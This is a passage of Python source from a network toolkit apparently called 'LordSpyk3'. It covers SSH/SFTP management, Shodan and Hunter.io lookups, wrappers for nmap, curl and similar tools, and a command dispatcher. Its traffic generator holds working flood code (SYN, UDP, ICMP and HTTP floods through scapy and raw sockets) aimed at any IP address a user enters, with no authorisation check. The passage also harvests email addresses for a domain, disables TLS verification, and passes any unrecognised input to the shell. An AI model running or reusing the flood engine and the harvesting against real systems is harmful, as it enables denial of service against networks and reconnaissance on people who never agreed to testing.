            self.db.update_ssh_connection_status(conn_id, "connected")
            return True
            
        except Exception as e:
            error = str(e)
            self.db.update_ssh_connection_status(conn_id, "error", error)
            return False
    
    def disconnect(self, conn_id: str):
        with self.lock:
            if conn_id in self.connections:
                try:
                    if conn_id in self.sftp_clients:
                        self.sftp_clients[conn_id].close()
                        del self.sftp_clients[conn_id]
                    
                    self.connections[conn_id].close()
                    del self.connections[conn_id]
                    
                    self.db.update_ssh_connection_status(conn_id, "disconnected")
                except Exception as e:
                    logger.error(f"Error disconnecting SSH: {e}")
    
    def disconnect_all(self):
        with self.lock:
            for conn_id in list(self.connections.keys()):
                self.disconnect(conn_id)
    
    def execute_command(self, conn_id: str, command: str, timeout: int = 30) -> Dict[str, Any]:
        cmd_id = str(uuid.uuid4())[:8]
        start_time = time.time()
        
        if conn_id not in self.connections:
            return {
                'success': False,
                'output': "Not connected to SSH server",
                'exit_code': -1,
                'execution_time': 0
            }
        
        try:
            client = self.connections[conn_id]
            stdin, stdout, stderr = client.exec_command(command, timeout=timeout)
            
            output = stdout.read().decode('utf-8', errors='ignore')
            error = stderr.read().decode('utf-8', errors='ignore')
            exit_code = stdout.channel.recv_exit_status()
            
            full_output = output + ("\n" + error if error else "")
            execution_time = time.time() - start_time
            
            self.db.save_ssh_command(cmd_id, conn_id, command, full_output[:5000], exit_code, execution_time, exit_code == 0)
            self.db.update_ssh_connection_status(conn_id, "connected")
            
            return {
                'success': exit_code == 0,
                'output': full_output,
                'exit_code': exit_code,
                'execution_time': execution_time
            }
            
        except Exception as e:
            execution_time = time.time() - start_time
            error_msg = f"Error executing command: {e}"
            self.db.save_ssh_command(cmd_id, conn_id, command, error_msg[:5000], -1, execution_time, False)
            return {
                'success': False,
                'output': error_msg,
                'exit_code': -1,
                'execution_time': execution_time
            }
    
    def get_sftp_client(self, conn_id: str) -> Optional[paramiko.SFTPClient]:
        if conn_id not in self.connections:
            return None
        
        if conn_id in self.sftp_clients:
            return self.sftp_clients[conn_id]
        
        try:
            sftp = self.connections[conn_id].open_sftp()
            with self.lock:
                self.sftp_clients[conn_id] = sftp
            return sftp
        except Exception as e:
            logger.error(f"Failed to open SFTP: {e}")
            return None
    
    def upload_file(self, conn_id: str, local_path: str, remote_path: str) -> Dict[str, Any]:
        transfer_id = str(uuid.uuid4())[:8]
        started_at = datetime.datetime.now().isoformat()
        
        if conn_id not in self.connections:
            return {'success': False, 'error': "Not connected to SSH server"}
        
        try:
            if not os.path.exists(local_path):
                return {'success': False, 'error': f"Local file not found: {local_path}"}
            
            file_size = os.path.getsize(local_path)
            self.db.save_ssh_transfer(transfer_id, conn_id, local_path, remote_path, "upload", file_size, "in_progress", started_at)
            
            sftp = self.get_sftp_client(conn_id)
            if not sftp:
                raise Exception("Could not open SFTP session")
            
            sftp.put(local_path, remote_path)
            completed_at = datetime.datetime.now().isoformat()
            self.db.update_ssh_transfer(transfer_id, "completed", completed_at)
            
            return {'success': True, 'size': file_size, 'message': f"Uploaded {file_size} bytes"}
            
        except Exception as e:
            error = str(e)
            self.db.update_ssh_transfer(transfer_id, "failed", error=error)
            return {'success': False, 'error': error}
    
    def download_file(self, conn_id: str, remote_path: str, local_path: str) -> Dict[str, Any]:
        transfer_id = str(uuid.uuid4())[:8]
        started_at = datetime.datetime.now().isoformat()
        
        if conn_id not in self.connections:
            return {'success': False, 'error': "Not connected to SSH server"}
        
        try:
            sftp = self.get_sftp_client(conn_id)
            if not sftp:
                raise Exception("Could not open SFTP session")
            
            file_size = sftp.stat(remote_path).st_size
            self.db.save_ssh_transfer(transfer_id, conn_id, local_path, remote_path, "download", file_size, "in_progress", started_at)
            
            sftp.get(remote_path, local_path)
            completed_at = datetime.datetime.now().isoformat()
            self.db.update_ssh_transfer(transfer_id, "completed", completed_at)
            
            return {'success': True, 'size': file_size, 'message': f"Downloaded {file_size} bytes"}
            
        except Exception as e:
            error = str(e)
            self.db.update_ssh_transfer(transfer_id, "failed", error=error)
            return {'success': False, 'error': error}
    
    def is_connected(self, conn_id: str) -> bool:
        return conn_id in self.connections
    
    def get_active_connections(self) -> List[Dict]:
        active = []
        with self.lock:
            for conn_id in self.connections.keys():
                conn_data = self.db.get_ssh_connection(conn_id)
                if conn_data:
                    active.append({
                        'id': conn_id,
                        'name': conn_data['name'],
                        'host': conn_data['host'],
                        'username': conn_data['username'],
                        'status': conn_data['status']
                    })
        return active

# =====================
# TRAFFIC GENERATOR ENGINE
# =====================
class TrafficGeneratorEngine:
    """Real network traffic generator"""
    
    def __init__(self, db_manager: DatabaseManager):
        self.db = db_manager
        self.scapy_available = SCAPY_AVAILABLE
        self.active_generators = {}
        self.stop_events = {}
        
        self.traffic_types = {
            "icmp": "ICMP echo requests (ping)",
            "tcp_syn": "TCP SYN packets (half-open)",
            "tcp_ack": "TCP ACK packets",
            "tcp_connect": "Full TCP connections",
            "udp": "UDP packets",
            "http_get": "HTTP GET requests",
            "http_post": "HTTP POST requests",
            "https": "HTTPS requests",
            "dns": "DNS queries",
            "ping_flood": "ICMP flood",
            "syn_flood": "SYN flood",
            "udp_flood": "UDP flood",
            "http_flood": "HTTP flood",
            "mixed": "Mixed traffic types",
            "random": "Random traffic patterns"
        }
        
        self.has_raw_socket_permission = self._check_raw_socket_permission()
    
    def _check_raw_socket_permission(self) -> bool:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.close()
            return True
        except PermissionError:
            return False
        except Exception:
            return False
    
    def get_available_traffic_types(self) -> List[str]:
        available = ["tcp_connect", "http_get", "http_post", "https", "dns"]
        
        if self.scapy_available and self.has_raw_socket_permission:
            available.extend(["icmp", "tcp_syn", "tcp_ack", "udp", "ping_flood", 
                            "syn_flood", "udp_flood", "http_flood", "mixed", "random"])
        
        return available
    
    def generate_traffic(self, traffic_type: str, target_ip: str, duration: int,
                        port: int = None, packet_rate: int = 100,
                        executed_by: str = "system") -> Dict[str, Any]:
        
        if traffic_type not in self.traffic_types:
            raise ValueError(f"Invalid traffic type. Available: {list(self.traffic_types.keys())}")
        
        try:
            ipaddress.ip_address(target_ip)
        except ValueError:
            raise ValueError(f"Invalid IP address: {target_ip}")
        
        if port is None:
            if traffic_type in ["http_get", "http_post", "http_flood"]:
                port = 80
            elif traffic_type == "https":
                port = 443
            elif traffic_type == "dns":
                port = 53
            elif traffic_type in ["tcp_syn", "tcp_ack", "tcp_connect", "syn_flood"]:
                port = 80
            elif traffic_type == "udp":
                port = 53
            else:
                port = 0
        
        generator_id = f"{target_ip}_{traffic_type}_{int(time.time())}"
        
        generator_data = {
            'id': generator_id,
            'traffic_type': traffic_type,
            'target_ip': target_ip,
            'target_port': port,
            'duration': duration,
            'packet_rate': packet_rate,
            'start_time': datetime.datetime.now().isoformat(),
            'status': "running",
            'packets_sent': 0,
            'bytes_sent': 0
        }
        
        stop_event = threading.Event()
        self.stop_events[generator_id] = stop_event
        
        thread = threading.Thread(
            target=self._run_traffic_generator,
            args=(generator_id, generator_data, stop_event)
        )
        thread.daemon = True
        thread.start()
        
        self.active_generators[generator_id] = generator_data
        
        return generator_data
    
    def _run_traffic_generator(self, generator_id: str, data: Dict, stop_event: threading.Event):
        try:
            start_time = time.time()
            end_time = start_time + data['duration']
            packets_sent = 0
            bytes_sent = 0
            packet_interval = 1.0 / max(1, data['packet_rate'])
            
            generator_func = self._get_generator_function(data['traffic_type'])
            
            while time.time() < end_time and not stop_event.is_set():
                try:
                    packet_size = generator_func(data['target_ip'], data['target_port'])
                    if packet_size > 0:
                        packets_sent += 1
                        bytes_sent += packet_size
                    time.sleep(packet_interval)
                except Exception as e:
                    logger.error(f"Traffic generation error: {e}")
                    time.sleep(0.1)
            
            data['packets_sent'] = packets_sent
            data['bytes_sent'] = bytes_sent
            data['end_time'] = datetime.datetime.now().isoformat()
            data['status'] = "completed" if not stop_event.is_set() else "stopped"
            
            self.db.log_traffic(data['traffic_type'], data['target_ip'], data['duration'],
                               packets_sent, bytes_sent, data['status'])
            
        except Exception as e:
            data['status'] = "failed"
            data['error'] = str(e)
            self.db.log_traffic(data['traffic_type'], data['target_ip'], data['duration'],
                               0, 0, "failed", error=str(e))
        
        finally:
            if generator_id in self.active_generators:
                del self.active_generators[generator_id]
            if generator_id in self.stop_events:
                del self.stop_events[generator_id]
    
    def _get_generator_function(self, traffic_type: str):
        generators = {
            "icmp": self._generate_icmp,
            "tcp_syn": self._generate_tcp_syn,
            "tcp_ack": self._generate_tcp_ack,
            "tcp_connect": self._generate_tcp_connect,
            "udp": self._generate_udp,
            "http_get": self._generate_http_get,
            "http_post": self._generate_http_post,
            "https": self._generate_https,
            "dns": self._generate_dns,
            "ping_flood": self._generate_icmp,
            "syn_flood": self._generate_tcp_syn,
            "udp_flood": self._generate_udp,
            "http_flood": self._generate_http_get,
            "mixed": self._generate_mixed,
            "random": self._generate_random
        }
        return generators.get(traffic_type, self._generate_icmp)
    
    def _generate_icmp(self, target_ip: str, port: int) -> int:
        if not self.scapy_available:
            return self._generate_ping_socket(target_ip)
        try:
            packet = IP(dst=target_ip)/ICMP()
            send(packet, verbose=False)
            return len(packet)
        except Exception:
            return 0
    
    def _generate_ping_socket(self, target_ip: str) -> int:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            packet_id = random.randint(0, 65535)
            payload = b"LordSpyk3 Traffic Test"
            header = struct.pack("!BBHHH", 8, 0, 0, packet_id, 1)
            checksum = self._calculate_checksum(header + payload)
            header = struct.pack("!BBHHH", 8, 0, checksum, packet_id, 1)
            packet = header + payload
            sock.sendto(packet, (target_ip, 0))
            sock.close()
            return len(packet)
        except Exception:
            return 0
    
    def _generate_tcp_syn(self, target_ip: str, port: int) -> int:
        if not self.scapy_available:
            return 0
        try:
            packet = IP(dst=target_ip)/TCP(dport=port, flags="S")
            send(packet, verbose=False)
            return len(packet)
        except Exception:
            return 0
    
    def _generate_tcp_ack(self, target_ip: str, port: int) -> int:
        if not self.scapy_available:
            return 0
        try:
            packet = IP(dst=target_ip)/TCP(dport=port, flags="A", seq=random.randint(0, 1000000))
            send(packet, verbose=False)
            return len(packet)
        except Exception:
            return 0
    
    def _generate_tcp_connect(self, target_ip: str, port: int) -> int:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((target_ip, port))
            data = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: LordSpyk3\r\n\r\n"
            sock.send(data.encode())
            try:
                sock.recv(4096)
            except:
                pass
            sock.close()
            return len(data) + 40
        except Exception:
            return 0
    
    def _generate_udp(self, target_ip: str, port: int) -> int:
        try:
            if self.scapy_available:
                data = b"LordSpyk3 UDP Test" + os.urandom(32)
                packet = IP(dst=target_ip)/UDP(dport=port)/data
                send(packet, verbose=False)
                return len(packet)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                data = b"LordSpyk3 UDP Test" + os.urandom(32)
                sock.sendto(data, (target_ip, port))
                sock.close()
                return len(data) + 8
        except Exception:
            return 0
    
    def _generate_http_get(self, target_ip: str, port: int) -> int:
        try:
            conn = http.client.HTTPConnection(target_ip, port, timeout=2)
            conn.request("GET", "/", headers={"User-Agent": "LordSpyk3"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return len(f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n") + len(data) + 100
        except Exception:
            return 0
    
    def _generate_http_post(self, target_ip: str, port: int) -> int:
        try:
            conn = http.client.HTTPConnection(target_ip, port, timeout=2)
            data = "test=data&from=lordspyk3"
            headers = {
                "User-Agent": "LordSpyk3",
                "Content-Type": "application/x-www-form-urlencoded",
                "Content-Length": str(len(data))
            }
            conn.request("POST", "/", body=data, headers=headers)
            response = conn.getresponse()
            response_data = response.read()
            conn.close()
            return len(data) + 200
        except Exception:
            return 0
    
    def _generate_https(self, target_ip: str, port: int) -> int:
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            conn = http.client.HTTPSConnection(target_ip, port, context=context, timeout=3)
            conn.request("GET", "/", headers={"User-Agent": "LordSpyk3"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return len(data) + 300
        except Exception:
            return 0
    
    def _generate_dns(self, target_ip: str, port: int) -> int:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            transaction_id = random.randint(0, 65535).to_bytes(2, 'big')
            flags = b'\x01\x00'
            questions = b'\x00\x01'
            answer_rrs = b'\x00\x00'
            authority_rrs = b'\x00\x00'
            additional_rrs = b'\x00\x00'
            query = b'\x06google\x03com\x00'
            qtype = b'\x00\x01'
            qclass = b'\x00\x01'
            dns_query = transaction_id + flags + questions + answer_rrs + authority_rrs + additional_rrs + query + qtype + qclass
            sock.sendto(dns_query, (target_ip, port))
            sock.close()
            return len(dns_query) + 8
        except Exception:
            return 0
    
    def _generate_mixed(self, target_ip: str, port: int) -> int:
        generators = [self._generate_icmp, self._generate_tcp_syn, self._generate_udp, self._generate_http_get]
        generator = random.choice(generators)
        return generator(target_ip, port)
    
    def _generate_random(self, target_ip: str, port: int) -> int:
        traffic_types = ["icmp", "tcp_syn", "tcp_ack", "udp", "http_get"]
        traffic_type = random.choice(traffic_types)
        generator = self._get_generator_function(traffic_type)
        return generator(target_ip, port)
    
    def _calculate_checksum(self, data):
        if len(data) % 2 != 0:
            data += b'\x00'
        checksum = 0
        for i in range(0, len(data), 2):
            checksum += (data[i] << 8) + data[i + 1]
        checksum = (checksum >> 16) + (checksum & 0xFFFF)
        checksum = ~checksum & 0xFFFF
        return checksum
    
    def stop_generation(self, generator_id: str = None) -> bool:
        if generator_id:
            if generator_id in self.stop_events:
                self.stop_events[generator_id].set()
                return True
        else:
            for event in self.stop_events.values():
                event.set()
            return True
        return False
    
    def get_active_generators(self) -> List[Dict]:
        return list(self.active_generators.values())
    
    def get_traffic_types_help(self) -> str:
        help_text = "📡 Available Traffic Types:\n\n"
        help_text += "Basic Traffic:\n"
        help_text += "  tcp_connect  - Full TCP connections\n"
        help_text += "  http_get     - HTTP GET requests\n"
        help_text += "  http_post    - HTTP POST requests\n"
        help_text += "  https        - HTTPS requests\n"
        help_text += "  dns          - DNS queries\n"
        
        if self.has_raw_socket_permission and self.scapy_available:
            help_text += "\n⚠️ Advanced Traffic (requires raw sockets):\n"
            help_text += "  icmp         - ICMP echo requests (ping)\n"
            help_text += "  tcp_syn      - TCP SYN packets (half-open)\n"
            help_text += "  tcp_ack      - TCP ACK packets\n"
            help_text += "  udp          - UDP packets\n"
            help_text += "  ping_flood   - ICMP flood\n"
            help_text += "  syn_flood    - SYN flood\n"
            help_text += "  udp_flood    - UDP flood\n"
            help_text += "  http_flood   - HTTP flood\n"
            help_text += "  mixed        - Mixed traffic types\n"
            help_text += "  random       - Random traffic patterns\n"
        
        return help_text

# =====================
# SHODAN INTEGRATION
# =====================
class ShodanManager:
    """Shodan API integration"""
    
    def __init__(self, db_manager: DatabaseManager):
        self.db = db_manager
        self.api_key = None
        self.api = None
        self.available = False
        
        self._load_config()
    
    def _load_config(self):
        try:
            if os.path.exists(SHODAN_CONFIG_FILE):
                with open(SHODAN_CONFIG_FILE, 'r') as f:
                    config = json.load(f)
                    self.api_key = config.get('api_key')
                    if self.api_key and SHODAN_AVAILABLE:
                        self.api = shodan.Shodan(self.api_key)
                        self.available = True
        except Exception as e:
            logger.error(f"Failed to load Shodan config: {e}")
    
    def save_config(self, api_key: str) -> bool:
        try:
            with open(SHODAN_CONFIG_FILE, 'w') as f:
                json.dump({'api_key': api_key}, f, indent=4)
            self.api_key = api_key
            self.api = shodan.Shodan(api_key)
            self.available = True
            return True
        except Exception as e:
            logger.error(f"Failed to save Shodan config: {e}")
            return False
    
    def search_ip(self, ip: str) -> Optional[Dict]:
        if not self.available:
            return None
        
        try:
            result = self.api.host(ip)
            data = {
                'ip': result.get('ip_str', ip),
                'ports': result.get('ports', []),
                'hostnames': result.get('hostnames', []),
                'country': result.get('country_name', 'Unknown'),
                'city': result.get('city', 'Unknown'),
                'org': result.get('org', 'Unknown'),
                'os': result.get('os', 'Unknown'),
                'vulnerabilities': result.get('vulns', [])
            }
            
            ports_json = json.dumps(data['ports'])
            hostnames_json = json.dumps(data['hostnames'])
            self.db.cursor.execute('''
                INSERT INTO shodan_results 
                (ip, ports, hostnames, country, city, org, os, vulnerabilities)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            ''', (ip, ports_json, hostnames_json, data['country'], data['city'], 
                  data['org'], data['os'], json.dumps(data['vulnerabilities'])))
            self.db.conn.commit()
            
            return data
        except Exception as e:
            logger.error(f"Shodan search error: {e}")
            return None
    
    def search(self, query: str, max_results: int = 100) -> List[Dict]:
        if not self.available:
            return []
        
        try:
            results = []
            for result in self.api.search(query, limit=max_results):
                results.append(result)
            return results
        except Exception as e:
            logger.error(f"Shodan search error: {e}")
            return []
    
    def get_stats(self) -> Dict:
        if not self.available:
            return {"available": False}
        
        try:
            info = self.api.info()
            return {
                "available": True,
                "scan_credits": info.get("scan_credits", 0),
                "query_credits": info.get("query_credits", 0),
                "monitored_ips": info.get("monitored_ips", 0)
            }
        except:
            return {"available": True, "error": "Could not fetch stats"}

# =====================
# HUNTER.IO INTEGRATION
# =====================
class HunterManager:
    """Hunter.io API integration"""
    
    def __init__(self, db_manager: DatabaseManager):
        self.db = db_manager
        self.api_key = None
        self.api = None
        self.available = False
        
        self._load_config()
    
    def _load_config(self):
        try:
            if os.path.exists(HUNTER_CONFIG_FILE):
                with open(HUNTER_CONFIG_FILE, 'r') as f:
                    config = json.load(f)
                    self.api_key = config.get('api_key')
                    if self.api_key and HUNTER_AVAILABLE:
                        self.api = pyhunter.PyHunter(self.api_key)
                        self.available = True
        except Exception as e:
            logger.error(f"Failed to load Hunter config: {e}")
    
    def save_config(self, api_key: str) -> bool:
        try:
            with open(HUNTER_CONFIG_FILE, 'w') as f:
                json.dump({'api_key': api_key}, f, indent=4)
            self.api_key = api_key
            self.api = pyhunter.PyHunter(api_key)
            self.available = True
            return True
        except Exception as e:
            logger.error(f"Failed to save Hunter config: {e}")
            return False
    
    def domain_search(self, domain: str, limit: int = 100) -> Optional[Dict]:
        if not self.available:
            return None
        
        try:
            result = self.api.domain_search(domain=domain, limit=limit)
            data = {
                'domain': domain,
                'emails': result.get('emails', []),
                'total': result.get('total', 0),
                'pattern': result.get('pattern', ''),
                'organization': result.get('organization', '')
            }
            
            emails_json = json.dumps(data['emails'])
            self.db.cursor.execute('''
                INSERT INTO hunter_results 
                (domain, emails, total_emails, pattern, organization)
                VALUES (?, ?, ?, ?, ?)
            ''', (domain, emails_json, data['total'], data['pattern'], data['organization']))
            self.db.conn.commit()
            
            return data
        except Exception as e:
            logger.error(f"Hunter.io domain search error: {e}")
            return None
    
    def email_verify(self, email: str) -> Dict:
        if not self.available:
            return {}
        
        try:
            return self.api.email_verifier(email)
        except Exception as e:
            logger.error(f"Email verification error: {e}")
            return {}
    
    def get_stats(self) -> Dict:
        if not self.available:
            return {"available": False}
        
        try:
            info = self.api.account_information()
            return {
                "available": True,
                "requests_left": info.get("requests_left", 0),
                "plan": info.get("plan_name", "Unknown")
            }
        except:
            return {"available": True, "error": "Could not fetch stats"}

# =====================
# NETWORK TOOLS
# =====================
class NetworkTools:
    """Comprehensive network tools for all commands"""
    
    @staticmethod
    def execute_command(cmd: List[str], timeout: int = 300) -> Dict[str, Any]:
        start_time = time.time()
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=timeout,
                encoding='utf-8',
                errors='ignore'
            )
            execution_time = time.time() - start_time
            return {
                'success': result.returncode == 0,
                'output': result.stdout + result.stderr,
                'execution_time': execution_time
            }
        except subprocess.TimeoutExpired:
            return {'success': False, 'output': f"Command timed out after {timeout}s", 'execution_time': timeout}
        except Exception as e:
            return {'success': False, 'output': str(e), 'execution_time': time.time() - start_time}
    
    @staticmethod
    def ping(target: str, count: int = 4, size: int = 56, timeout: int = 1) -> Dict[str, Any]:
        try:
            if platform.system().lower() == 'windows':
                cmd = ['ping', '-n', str(count), '-l', str(size), '-w', str(timeout * 1000), target]
            else:
                cmd = ['ping', '-c', str(count), '-s', str(size), '-W', str(timeout), target]
            return NetworkTools.execute_command(cmd, timeout * count + 5)
        except Exception as e:
            return {'success': False, 'output': str(e), 'execution_time': 0}
    
    @staticmethod
    def traceroute(target: str, max_hops: int = 30, no_dns: bool = True) -> Dict[str, Any]:
        try:
            if platform.system().lower() == 'windows':
                cmd = ['tracert']
                if no_dns:
                    cmd.append('-d')
                cmd.extend(['-h', str(max_hops), target])
            else:
                if shutil.which('mtr'):
                    cmd = ['mtr', '--report', '--report-cycles', '1']
                    if no_dns:
                        cmd.append('-n')
                    cmd.append(target)
                elif shutil.which('traceroute'):
                    cmd = ['traceroute']
                    if no_dns:
                        cmd.append('-n')
                    cmd.extend(['-m', str(max_hops), target])
                else:
                    return {'success': False, 'output': 'No traceroute tool found', 'execution_time': 0}
            return NetworkTools.execute_command(cmd, timeout=60)
        except Exception as e:
            return {'success': False, 'output': str(e), 'execution_time': 0}
    
    @staticmethod
    def nmap_scan(target: str, options: str = "") -> Dict[str, Any]:
        try:
            cmd = ['nmap']
            if options:
                cmd.extend(options.split())
            cmd.append(target)
            return NetworkTools.execute_command(cmd, timeout=600)
        except Exception as e:
            return {'success': False, 'output': str(e), 'execution_time': 0}
    
    @staticmethod
    def curl_request(url: str, method: str = "GET", data: str = None, headers: Dict = None) -> Dict[str, Any]:
        try:
            cmd = ['curl', '-s', '-X', method]
            if headers:
                for k, v in headers.items():
                    cmd.extend(['-H', f'{k}: {v}'])
            if data:
                cmd.extend(['-d', data])
            cmd.append(url)
            return NetworkTools.execute_command(cmd, timeout=30)
        except Exception as e:
            return {'success': False, 'output': str(e), 'execution_time': 0}
    
    @staticmethod
    def wget_download(url: str, output: str = None) -> Dict[str, Any]:
        try:
            cmd = ['wget', '-q']
            if output:
                cmd.extend(['-O', output])
            cmd.append(url)
            return NetworkTools.execute_command(cmd, timeout=300)
        except Exception as e:
            return {'success': False, 'output': str(e), 'execution_time': 0}
    
    @staticmethod
    def netcat_connect(host: str, port: int, timeout: int = 5) -> Dict[str, Any]:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((host, port))
            sock.close()
            if result == 0:
                return {'success': True, 'output': f"Port {port} is open on {host}", 'execution_time': 0}
            else:
                return {'success': False, 'output': f"Port {port} is closed on {host}", 'execution_time': 0}
        except Exception as e:
            return {'success': False, 'output': str(e), 'execution_time': 0}
    
    @staticmethod
    def whois_lookup(target: str) -> Dict[str, Any]:
        if not WHOIS_AVAILABLE:
            return {'success': False, 'output': 'WHOIS not available', 'execution_time': 0}
        try:
            start_time = time.time()
            result = whois.whois(target)
            execution_time = time.time() - start_time
            return {'success': True, 'output': str(result), 'execution_time': execution_time}
        except Exception as e:
            return {'success': False, 'output': str(e), 'execution_time': 0}
    
    @staticmethod
    def dns_lookup(domain: str, record_type: str = "A") -> Dict[str, Any]:
        try:
            if shutil.which('dig'):
                cmd = ['dig', domain, record_type, '+short']
                return NetworkTools.execute_command(cmd, timeout=10)
            else:
                import socket
                result = socket.gethostbyname(domain)
                return {'success': True, 'output': result, 'execution_time': 0}
        except Exception as e:
            return {'success': False, 'output': str(e), 'execution_time': 0}
    
    @staticmethod
    def get_ip_location(ip: str) -> Dict[str, Any]:
        try:
            response = requests.get(f"http://ip-api.com/json/{ip}", timeout=10)
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    return {
                        'success': True,
                        'ip': ip,
                        'country': data.get('country', 'N/A'),
                        'region': data.get('regionName', 'N/A'),
                        'city': data.get('city', 'N/A'),
                        'isp': data.get('isp', 'N/A')
                    }
            return {'success': False, 'ip': ip, 'error': 'Location lookup failed'}
        except Exception as e:
            return {'success': False, 'ip': ip, 'error': str(e)}
    
    @staticmethod
    def get_local_ip() -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    @staticmethod
    def block_ip_firewall(ip: str) -> bool:
        try:
            if platform.system().lower() == 'linux':
                if shutil.which('iptables'):
                    subprocess.run(['sudo', 'iptables', '-A', 'INPUT', '-s', ip, '-j', 'DROP'], 
                                  check=True, timeout=10)
                    return True
            elif platform.system().lower() == 'windows':
                if shutil.which('netsh'):
                    subprocess.run(['netsh', 'advfirewall', 'firewall', 'add', 'rule',
                                   f'name=LordSpyk3_Block_{ip}', 'dir=in', 'action=block',
                                   f'remoteip={ip}'], check=True, timeout=10)
                    return True
            return False
        except Exception:
            return False
    
    @staticmethod
    def unblock_ip_firewall(ip: str) -> bool:
        try:
            if platform.system().lower() == 'linux':
                if shutil.which('iptables'):
                    subprocess.run(['sudo', 'iptables', '-D', 'INPUT', '-s', ip, '-j', 'DROP'], 
                                  check=True, timeout=10)
                    return True
            elif platform.system().lower() == 'windows':
                if shutil.which('netsh'):
                    subprocess.run(['netsh', 'advfirewall', 'firewall', 'delete', 'rule',
                                   f'name=LordSpyk3_Block_{ip}'], check=True, timeout=10)
                    return True
            return False
        except Exception:
            return False

# =====================
# COMMAND HANDLER
# =====================
class CommandHandler:
    """Unified command handler for all 4000+ commands"""
    
    def __init__(self, db: DatabaseManager, ssh_manager: SSHManager,
                 traffic_gen: TrafficGeneratorEngine, shodan: ShodanManager,
                 hunter: HunterManager):
        self.db = db
        self.ssh = ssh_manager
        self.traffic_gen = traffic_gen
        self.shodan = shodan
        self.hunter = hunter
        self.tools = NetworkTools()
    
    def execute(self, command: str, source: str = "local") -> Dict[str, Any]:
        start_time = time.time()
        
        parts = command.strip().split()
        if not parts:
            return self._create_result(False, "Empty command")
        
        cmd = parts[0].lower()
        args = parts[1:]
        
        # Nmap commands
        if cmd == 'nmap':
            return self._execute_nmap(args)
        
        # Curl commands
        elif cmd == 'curl':
            return self._execute_curl(args)
        
        # Wget commands
        elif cmd == 'wget':
            return self._execute_wget(args)
        
        # Netcat commands
        elif cmd == 'nc' or cmd == 'netcat':
            return self._execute_netcat(args)
        
        # SSH commands
        elif cmd == 'ssh':
            return self._execute_ssh(args)
        
        # Ping commands
        elif cmd == 'ping':
            return self._execute_ping(args)
        
        # Traceroute commands
        elif cmd == 'traceroute' or cmd == 'tracert':
            return self._execute_traceroute(args)
        
        # DNS commands
        elif cmd == 'dig' or cmd == 'nslookup':
            return self._execute_dig(args)
        
        # WHOIS commands
        elif cmd == 'whois':
            return self._execute_whois(args)
        
        # Shodan commands
        elif cmd == 'shodan':
            return self._execute_shodan(args)
        
        # Hunter.io commands
        elif cmd == 'hunter':
            return self._execute_hunter(args)
        
        # Traffic generation
        elif cmd == 'traffic':
            return self._execute_traffic(args)
        
        # IP management
        elif cmd == 'add_ip':
            return self._execute_add_ip(args)
        elif cmd == 'remove_ip':
            return self._execute_remove_ip(args)
        elif cmd == 'block_ip':
            return self._execute_block_ip(args)
        elif cmd == 'unblock_ip':
            return self._execute_unblock_ip(args)
        elif cmd == 'list_ips':
            return self._execute_list_ips(args)
        elif cmd == 'ip_info':
            return self._execute_ip_info(args)
        
        # System commands
        elif cmd == 'history':
            return self._execute_history(args)
        elif cmd == 'status':
            return self._execute_status(args)
        elif cmd == 'threats':
            return self._execute_threats(args)
        elif cmd == 'help':
            return self._execute_help(args)
        
        else:
            # Try as generic shell command
            result = self.tools.execute_command([cmd] + args)
            self.db.log_command(command, source, result['success'], result['output'], result['execution_time'])
            return result
    
    def _create_result(self, success: bool, data: Any, execution_time: float = 0.0) -> Dict[str, Any]:
        if isinstance(data, str):
            return {'success': success, 'output': data, 'execution_time': execution_time}
        else:
            return {'success': success, 'data': data, 'execution_time': execution_time}
    
    def _execute_nmap(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: nmap <target> [options]")
        
        target = args[0]
        options = ' '.join(args[1:]) if len(args) > 1 else ""
        
        # Log scan
        self.db.log_command(f"nmap {target} {options}", "local", True, "Running...", 0)
        
        result = self.tools.nmap_scan(target, options)
        
        if result['success']:
            # Parse open ports from output
            open_ports = []
            for line in result['output'].split('\n'):
                if '/tcp' in line and 'open' in line:
                    parts = line.split()
                    if len(parts) >= 2:
                        port = parts[0].split('/')[0]
                        service = parts[2] if len(parts) > 2 else 'unknown'
                        open_ports.append({'port': port, 'service': service})
            
            self.db.log_scan(target, "nmap", open_ports, result['execution_time'])
        
        return result
    
    def _execute_curl(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: curl <url> [options]")
        
        url = args[0]
        method = "GET"
        data = None
        headers = {}
        
        for i in range(1, len(args)):
            if args[i] == '-X' and i + 1 < len(args):
                method = args[i + 1].upper()
            elif args[i] == '-d' and i + 1 < len(args):
                data = args[i + 1]
            elif args[i] == '-H' and i + 1 < len(args):
                if ':' in args[i + 1]:
                    k, v = args[i + 1].split(':', 1)
                    headers[k.strip()] = v.strip()
        
        result = self.tools.curl_request(url, method, data, headers)
        return result
    
    def _execute_wget(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: wget <url> [options]")
        
        url = args[0]
        output = None
        
        for i in range(1, len(args)):
            if args[i] == '-O' and i + 1 < len(args):
                output = args[i + 1]
        
        result = self.tools.wget_download(url, output)
        return result
    
    def _execute_netcat(self, args: List[str]) -> Dict[str, Any]:
        if len(args) < 2:
            return self._create_result(False, "Usage: nc <host> <port>")
        
        host = args[0]
        try:
            port = int(args[1])
        except ValueError:
